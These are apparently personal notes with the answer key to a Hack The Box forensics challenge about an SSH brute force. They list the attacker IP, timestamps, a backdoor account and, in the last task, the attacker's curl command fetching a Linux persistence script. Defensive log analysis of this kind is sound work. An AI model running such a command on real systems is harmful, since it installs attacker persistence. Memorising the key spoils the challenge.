---
title: Brutus
created: 11 Oct 2025 10:42
difficulty: Easy
difficult_sort: 1
platform: Hack The Box
category: DFIR
source_url: https://app.hackthebox.com/sherlocks/Brutus
tags:
  - htb/sherlocks
---
# Introduction - Brutus
![400](<./attachments/Brutus.png>)
In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
## Tutorial 
- PDF: [Brutus-Writeup](<./attachments/Brutus.pdf>)
```cardlink
url: https://www.youtube.com/watch?v=bv08UcIL1po
title: "Analyzing auth.log and Playing with Grok Filters - HTB Sherlocks - Brutus"
description: "00:00 - Introduction02:10 - Going over the wtmp file, showing utmpdump and last04:30 - Start of talking about the auth.log, grabbing all the programs (ssh, c..."
host: www.youtube.com
favicon: https://www.youtube.com/s/desktop/26a38178/img/favicon_32x32.png
image: https://i.ytimg.com/vi/bv08UcIL1po/maxresdefault.jpg
```

# Question and Answers
## Task 1
**Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?**
### Steps
### Answer 
```txt 
65.2.161.68
```
## Task 2 
**The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?**
### Steps
### Answer 
```txt
root
```
## Task 3
**Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.**
### Steps 
### Answer
```txt
2024-03-06 06:32:45
```
## Task 4
**SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?**
### Steps 
### Answer
```txt
37
```
## Task 5
**The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?**
### Steps 
### Answer
```txt
cyberjunkie
```
## Task 6
**What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?**
### Steps 
### Answer
```txt
T1136.001
```
## Task 7
**What time did the attacker's first SSH session end according to auth.log?**
### Steps 
### Answer
```txt
2024-03-06 06:37:24
```
## Task 8
**The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**
### Steps 
### Answer
```txt
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```